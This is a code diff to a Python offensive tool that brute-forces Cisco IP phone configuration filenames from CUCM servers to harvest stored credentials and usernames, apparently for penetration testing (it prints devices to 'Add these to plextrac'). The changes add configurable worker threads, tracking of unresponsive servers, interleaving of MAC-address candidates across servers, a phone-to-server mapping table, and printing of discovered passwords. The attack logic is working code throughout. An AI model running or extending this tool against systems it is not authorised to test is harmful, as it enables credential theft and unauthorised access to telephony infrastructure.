@@ -166,7 +166,7 @@ def download_config_http(cucm_host, filename, timeout=5):
     return None
 
 
-def download_config_tftp(cucm_host, filename, timeout=5):
+def download_config_tftp(cucm_host, filename, timeout=5, raise_on_error=False):
     if _TEST_MODE:
         return _TEST_CONFIG
 
@@ -178,6 +178,8 @@ def download_config_tftp(cucm_host, filename, timeout=5):
         with open(tmp_path, "r", errors="ignore") as handle:
             return handle.read()
     except Exception:
+        if raise_on_error:
+            raise
         return None
     finally:
         try:
@@ -188,16 +190,25 @@ def download_config_tftp(cucm_host, filename, timeout=5):
 
 
 def configure_tftpy_logging(debug_enabled):
+    class _SuppressTftpFileNotFound(logging.Filter):
+        def filter(self, record):
+            msg = record.getMessage()
+            return "ERR packet - errorcode: 1, message: b'File not found'" not in msg
+
     if debug_enabled:
         logging.getLogger('tftpy.TftpClient').setLevel(logging.DEBUG)
         logging.getLogger('tftpy.TftpContexts').setLevel(logging.DEBUG)
-        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.DEBUG)
+        packet_logger = logging.getLogger('tftpy.TftpPacketTypes')
+        packet_logger.setLevel(logging.DEBUG)
+        packet_logger.addFilter(_SuppressTftpFileNotFound())
         logging.getLogger('tftpy').setLevel(logging.DEBUG)
     else:
         # Silence noisy TFTP warnings unless --debug is enabled
         logging.getLogger('tftpy.TftpClient').setLevel(logging.CRITICAL)
         logging.getLogger('tftpy.TftpContexts').setLevel(logging.CRITICAL)
-        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.CRITICAL)
+        packet_logger = logging.getLogger('tftpy.TftpPacketTypes')
+        packet_logger.setLevel(logging.CRITICAL)
+        packet_logger.addFilter(_SuppressTftpFileNotFound())
         logging.getLogger('tftpy').setLevel(logging.CRITICAL)
 
 
@@ -233,7 +244,7 @@ class TFTPBackoffManager:
             return self.delay
 
 
-def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download):
+def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download, dead_cucm, dead_cucm_lock):
     """
     Worker thread for downloading config files.
     """
@@ -254,6 +265,11 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
                 results_queue.put((index, full_mac, None, 'NO_CUCM', False))
                 work_queue.task_done()
                 continue
+            with dead_cucm_lock:
+                if task_cucm in dead_cucm:
+                    results_queue.put((index, full_mac, None, 'CUCM_DEAD', False))
+                    work_queue.task_done()
+                    continue
 
             # Check cache first (unless force flag is set or --no-db)
             if not force_download and not no_db:
@@ -277,14 +293,14 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
 
             try:
                 if use_tftp:
-                    content = download_config_tftp(task_cucm, filename)
+                    content = download_config_tftp(task_cucm, filename, raise_on_error=True)
                     if content is None:
                         content = download_config_http(task_cucm, filename)
                         method = 'HTTP' if content else 'TFTP+HTTP'
                 else:
                     content = download_config_http(task_cucm, filename)
                     if content is None:
-                        content = download_config_tftp(task_cucm, filename)
+                        content = download_config_tftp(task_cucm, filename, raise_on_error=True)
                         method = 'TFTP' if content else 'HTTP+TFTP'
 
                 if content:
@@ -296,6 +312,10 @@ def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_mana
                 backoff_manager.record_error()
                 if globals().get('debug', False):
                     print(f'[!] Worker error downloading {filename}: {str(e)}')
+                error_text = str(e).lower()
+                if "file not found" not in error_text:
+                    with dead_cucm_lock:
+                        dead_cucm.add(task_cucm)
 
             # Log the attempt (unless --no-db)
             if not no_db:
@@ -559,6 +579,17 @@ def init_database(db_file='thief.db'):
             UNIQUE(cucm_host, full_mac)
         )
     ''')
+
+    # Create table for CUCM-to-phone mappings
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS phone_cucm (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            phone_ip TEXT NOT NULL,
+            discovery_time TEXT NOT NULL,
+            UNIQUE(cucm_host, phone_ip)
+        )
+    ''')
     
     conn.commit()
     conn.close()
@@ -720,6 +751,25 @@ def log_mac_prefix_to_db(cucm_host, phone_ip, full_mac, partial_mac, db_file='th
     except Exception as e:
         return False
 
+
+def log_phone_cucm_to_db(cucm_host, phone_ip, db_file='thief.db'):
+    """
+    Log CUCM server mapping for a discovered phone.
+    """
+    try:
+        conn = sqlite3.connect(db_file)
+        cursor = conn.cursor()
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        cursor.execute('''
+            INSERT OR IGNORE INTO phone_cucm (cucm_host, phone_ip, discovery_time)
+            VALUES (?, ?, ?)
+        ''', (cucm_host, phone_ip, timestamp))
+        conn.commit()
+        conn.close()
+        return True
+    except Exception:
+        return False
+
 def display_database_summary(db_file='thief.db', cucm_filter=None):
     """
     Display credentials discovery summary from database
@@ -799,6 +849,29 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             else:
                 raise
         
+        # Get phone -> CUCM mappings (handle missing table gracefully)
+        phone_cucm = []
+        try:
+            if cucm_filter:
+                cursor.execute('''
+                    SELECT cucm_host, phone_ip, discovery_time
+                    FROM phone_cucm
+                    WHERE cucm_host = ?
+                    ORDER BY discovery_time DESC
+                ''', (cucm_filter,))
+            else:
+                cursor.execute('''
+                    SELECT cucm_host, phone_ip, discovery_time
+                    FROM phone_cucm
+                    ORDER BY discovery_time DESC
+                ''')
+            phone_cucm = cursor.fetchall()
+        except sqlite3.OperationalError as e:
+            if 'no such table' in str(e):
+                phone_cucm = []
+            else:
+                raise
+
         # Get download stats (handle missing table gracefully)
         total_attempts = 0
         successful_downloads = 0
@@ -826,7 +899,7 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
         
         conn.close()
         
-        if not credentials and not usernames and not mac_prefixes:
+        if not credentials and not usernames and not mac_prefixes and not phone_cucm:
             print(f'\n[-] No data found in database')
             if cucm_filter:
                 print(f'[-] Filter: CUCM host = {cucm_filter}')
@@ -845,11 +918,14 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
         if credentials:
             # Group by device
             cucm_hosts = set()
+            devices_with_passwords = set()
             for cucm, device, username, password, timestamp in credentials:
                 cucm_hosts.add(cucm)
                 if device not in devices_with_creds:
                     devices_with_creds[device] = []
                 devices_with_creds[device].append((username, password, timestamp))
+                if password:
+                    devices_with_passwords.add(device)
             print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(credentials)} total)\033[0m')
             if len(cucm_hosts) > 1:
                 print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
@@ -860,6 +936,10 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
                 for username, password, timestamp in devices_with_creds[device]:
                     user_display = username if username else 'N/A'
                     print(f'{device:<20} {user_display:<20} \033[91m{password:<20}\033[0m')
+            if devices_with_passwords:
+                print("\nAdd these to plextrac")
+                for device in sorted(devices_with_passwords):
+                    print(device)
         if usernames:
             # Group by device
             cucm_hosts = set()
@@ -898,6 +978,21 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             unique_prefixes = sorted(set(p[3] for p in mac_prefixes))
             print(f'\n\033[1mUnique MAC Prefixes for Brute Force ({len(unique_prefixes)} unique):\033[0m')
             print(f'  {", ".join(unique_prefixes)}')
+
+        if phone_cucm:
+            cucm_phones = {}
+            for cucm, phone_ip, timestamp in phone_cucm:
+                if cucm not in cucm_phones:
+                    cucm_phones[cucm] = []
+                cucm_phones[cucm].append((phone_ip, timestamp))
+
+            print(f'\n\033[1m[+] PHONE -> CUCM MAPPINGS ({len(phone_cucm)} total)\033[0m')
+            print("-"*70)
+            print(f'{"Phone IP":<18} {"CUCM Host":<30}')
+            print("-"*70)
+            for cucm in sorted(cucm_phones.keys()):
+                for phone_ip, timestamp in cucm_phones[cucm]:
+                    print(f'{phone_ip:<18} {cucm:<30}')
         
         print(f'\n{"="*70}')
         print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
@@ -907,6 +1002,8 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             print(f'  • MAC prefixes discovered:      {len(mac_prefixes)}')
             unique_prefixes = len(set(p[3] for p in mac_prefixes))
             print(f'  • Unique MAC prefixes:          {unique_prefixes}')
+        if phone_cucm:
+            print(f'  • Phone -> CUCM mappings:       {len(phone_cucm)}')
         if credentials:
             print(f'  • Devices with credentials:     {len(devices_with_creds)}')
         if usernames:
@@ -988,6 +1085,7 @@ if __name__ == '__main__':
     
     # Attack Options
     parser.add_argument('-b','--brute-mac', nargs='?', const=True, default=False, type=str, help='Brute force all MAC address variations for detected phone prefixes. Optionally specify number of suffix characters (e.g., -b 4 for last 4 chars, default: 3)')
+    parser.add_argument('-T','--threads', type=int, default=40, help='Number of worker threads for brute force mode (default: 40)')
     parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
     parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
     
@@ -1044,6 +1142,7 @@ if __name__ == '__main__':
         except Exception:
             brute_mac_len = 3
     csv_output = args.csv
+    threads = args.threads
     db_file = args.db
     no_db = args.no_db
     force_download = args.force
@@ -1112,6 +1211,7 @@ if __name__ == '__main__':
                         
                         # Log MAC prefix to database unless --no-db is set
                         if not no_db:
+                            log_phone_cucm_to_db(phone_cucm, phone, db_file)
                             log_mac_prefix_to_db(phone_cucm, phone, full_mac, partial_mac, db_file)
                     else:
                         print(f'  ✗ Could not extract MAC from hostname: {hostname}')
@@ -1138,18 +1238,35 @@ if __name__ == '__main__':
         
         # Build combined list of all MAC candidates from all phones
         print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
-        all_candidates = []
+        candidates_by_cucm = {}
         max_variations = 16 ** brute_mac_len
         for partial_mac in all_found_macs:
             phone_cucm = mac_to_cucm[partial_mac]
+            if phone_cucm not in candidates_by_cucm:
+                candidates_by_cucm[phone_cucm] = []
             for i in range(max_variations):
                 suffix = f'{i:0{brute_mac_len}X}'
                 full_mac = partial_mac + suffix
                 filename = f'SEP{full_mac}.cnf.xml'
-                all_candidates.append((phone_cucm, full_mac, filename))
-        
-        # Randomize the order to distribute load across different MAC prefixes
-        random.shuffle(all_candidates)
+                candidates_by_cucm[phone_cucm].append((phone_cucm, full_mac, filename))
+
+        # Randomize per-CUCM queues, then interleave to distribute load across servers
+        for cucm in candidates_by_cucm:
+            random.shuffle(candidates_by_cucm[cucm])
+
+        all_candidates = []
+        cucm_order = list(candidates_by_cucm.keys())
+        idx = 0
+        while True:
+            added = False
+            for cucm in cucm_order:
+                if idx < len(candidates_by_cucm[cucm]):
+                    all_candidates.append(candidates_by_cucm[cucm][idx])
+                    added = True
+            if not added:
+                break
+            idx += 1
+
         print(f'Randomized {len(all_candidates)} total candidates across all phones\n')
         
         # ============================================================================
@@ -1161,123 +1278,144 @@ if __name__ == '__main__':
         # Use the args values that were set earlier (no need for globals().get since they're in scope)
         # db_file, no_db, and force_download are already defined above
         
-        print(f'Starting multi-threaded brute force with 40 workers...')
+        if threads < 1:
+            print('Threads must be at least 1')
+            quit(1)
+
+        print(f'Starting multi-threaded brute force with {threads} workers...')
         
         work_queue = queue.Queue()
         results_queue = queue.Queue()
         backoff_manager = TFTPBackoffManager()
-        num_threads = 40
+        dead_cucm = set()
+        dead_cucm_lock = threading.Lock()
+        num_threads = threads
         
         # Create and start worker threads
         threads = []
         for i in range(num_threads):
             t = threading.Thread(
                 target=download_worker,
-                args=(work_queue, results_queue, None, use_tftp, backoff_manager, no_db, db_file, force_download),
+                args=(work_queue, results_queue, None, use_tftp, backoff_manager, no_db, db_file, force_download, dead_cucm, dead_cucm_lock),
                 daemon=True,
                 name=f'Worker-{i}'
             )
             t.start()
             threads.append(t)
-        
+
+        interrupted = False
+        all_configs = []
+        found_macs = []
+        skipped = 0
+        successful = 0
+        processed = 0
+
         try:
             print(f'[*] Started {num_threads} worker threads')
             print(f'[*] Queuing {len(all_candidates)} download tasks...')
             sys.stdout.flush()
         except (ValueError, AttributeError):
             pass
-        
-        # Queue all candidates
-        for idx, (cucm, full_mac, filename) in enumerate(all_candidates):
-            work_queue.put((idx, full_mac, filename, cucm))
-            if (idx + 1) % 10000 == 0:
-                try:
-                    print(f'  Queued {idx + 1}/{len(all_candidates)} tasks...', flush=True)
-                except (ValueError, AttributeError):
-                    pass  # stdout closed or unavailable
-        
+
         try:
-            print(f'[*] All {len(all_candidates)} tasks queued', flush=True)
-            print(f'[*] Processing downloads with {num_threads} workers (this may take several minutes)...\n', flush=True)
-        except (ValueError, AttributeError):
-            pass
-        
-        # Process results with progress bar
-        all_configs = []
-        found_macs = []
-        skipped = 0
-        successful = 0
-        processed = 0
-        
-        # Use alive_bar only if output is to a terminal
-        use_progress_bar = sys.stdout.isatty()
-        
-        if use_progress_bar:
-            with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
-                for _ in range(len(all_candidates)):
+            # Queue all candidates
+            for idx, (cucm, full_mac, filename) in enumerate(all_candidates):
+                work_queue.put((idx, full_mac, filename, cucm))
+                if (idx + 1) % 10000 == 0:
                     try:
-                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
-                        
-                        if was_cached:
-                            skipped += 1
-                        
-                        if content:
-                            all_configs.append((full_mac, content))
-                            found_macs.append(full_mac)
-                            successful += 1
-                            # Update progress bar title with current count
-                            prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
-                        
-                        prog_bar()
-                            
-                    except queue.Empty:
-                        print('[!] Timeout waiting for results')
-                        break
-        else:
-            # Simple text-based progress for non-TTY output
+                        print(f'  Queued {idx + 1}/{len(all_candidates)} tasks...', flush=True)
+                    except (ValueError, AttributeError):
+                        pass  # stdout closed or unavailable
+
             try:
-                print(f'[*] Starting to process results...')
-                sys.stdout.flush()
-                
-                last_status_time = time.time()
-                for _ in range(len(all_candidates)):
-                    try:
-                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
-                        processed += 1
-                        
-                        if was_cached:
-                            skipped += 1
-                        
-                        if content:
-                            all_configs.append((full_mac, content))
-                            found_macs.append(full_mac)
-                            successful += 1
-                            print(f'[+] Found config #{successful}: SEP{full_mac}')
-                            sys.stdout.flush()
-                        
-                        # Print progress every 1000 items or every 5 seconds
-                        current_time = time.time()
-                        if processed % 1000 == 0 or (current_time - last_status_time) >= 5:
+                print(f'[*] All {len(all_candidates)} tasks queued', flush=True)
+                print(f'[*] Processing downloads with {num_threads} workers (this may take several minutes)...\n', flush=True)
+            except (ValueError, AttributeError):
+                pass
+
+            # Use alive_bar only if output is to a terminal
+            use_progress_bar = sys.stdout.isatty()
+
+            if use_progress_bar:
+                with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
+                    for _ in range(len(all_candidates)):
+                        try:
+                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+
+                            if was_cached:
+                                skipped += 1
+
+                            if content:
+                                all_configs.append((full_mac, content))
+                                found_macs.append(full_mac)
+                                successful += 1
+                                # Update progress bar title with current count
+                                prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
+
+                            prog_bar()
+
+                        except queue.Empty:
+                            print('[!] Timeout waiting for results')
+                            break
+            else:
+                # Simple text-based progress for non-TTY output
+                try:
+                    print(f'[*] Starting to process results...')
+                    sys.stdout.flush()
+
+                    last_status_time = time.time()
+                    for _ in range(len(all_candidates)):
+                        try:
+                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
+                            processed += 1
+
+                            if was_cached:
+                                skipped += 1
+
+                            if content:
+                                all_configs.append((full_mac, content))
+                                found_macs.append(full_mac)
+                                successful += 1
+                                print(f'[+] Found config #{successful}: SEP{full_mac}')
+                                sys.stdout.flush()
+
+                            # Print progress every 1000 items or every 5 seconds
+                            current_time = time.time()
+                            if processed % 1000 == 0 or (current_time - last_status_time) >= 5:
+                                remaining = len(all_candidates) - processed
+                                print(f'[*] Progress: {processed}/{len(all_candidates)} processed ({successful} found, {remaining} remaining)')
+                                sys.stdout.flush()
+                                last_status_time = current_time
+
+                        except queue.Empty:
                             remaining = len(all_candidates) - processed
-                            print(f'[*] Progress: {processed}/{len(all_candidates)} processed ({successful} found, {remaining} remaining)')
+                            print(f'[!] Timeout after processing {processed}/{len(all_candidates)} items ({remaining} remaining)')
+                            break
+                        except Exception as e:
+                            print(f'[!] ERROR in results processing: {type(e).__name__}: {e}')
+                            import traceback
+                            traceback.print_exc()
                             sys.stdout.flush()
-                            last_status_time = current_time
-                            
-                    except queue.Empty:
-                        remaining = len(all_candidates) - processed
-                        print(f'[!] Timeout after processing {processed}/{len(all_candidates)} items ({remaining} remaining)')
-                        break
-                    except Exception as e:
-                        print(f'[!] ERROR in results processing: {type(e).__name__}: {e}')
-                        import traceback
-                        traceback.print_exc()
-                        sys.stdout.flush()
-                        break
-            except Exception as outer_e:
-                print(f'[!] FATAL ERROR in else block: {type(outer_e).__name__}: {outer_e}')
-                import traceback
-                traceback.print_exc()
-                sys.stdout.flush()
+                            break
+                except Exception as outer_e:
+                    print(f'[!] FATAL ERROR in else block: {type(outer_e).__name__}: {outer_e}')
+                    import traceback
+                    traceback.print_exc()
+                    sys.stdout.flush()
+        except KeyboardInterrupt:
+            interrupted = True
+            print('\n[!] Interrupted by user. Stopping brute force gracefully.')
+        finally:
+            # Send poison pills to stop workers
+            for _ in range(num_threads):
+                work_queue.put(None)
+
+            # Wait for all workers to exit gracefully
+            for t in threads:
+                t.join()
+
+            if interrupted:
+                quit(1)
         
         # Wait for all queued work to be completed
         try:
@@ -1293,14 +1431,6 @@ if __name__ == '__main__':
             sys.stdout.flush()
         except (ValueError, AttributeError):
             pass
-        
-        # Send poison pills to stop workers
-        for _ in range(num_threads):
-            work_queue.put(None)
-        
-        # Wait for all workers to exit gracefully
-        for t in threads:
-            t.join()
         
         # Print summary
         if found_macs:
@@ -1456,6 +1586,8 @@ if __name__ == '__main__':
                 continue
             else:
                 print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
+                if not no_db:
+                    log_phone_cucm_to_db(CUCM_host, phone, db_file)
             
             # Get hostnames for this phone
             hostnames = [get_hostname_from_phone(phone)]
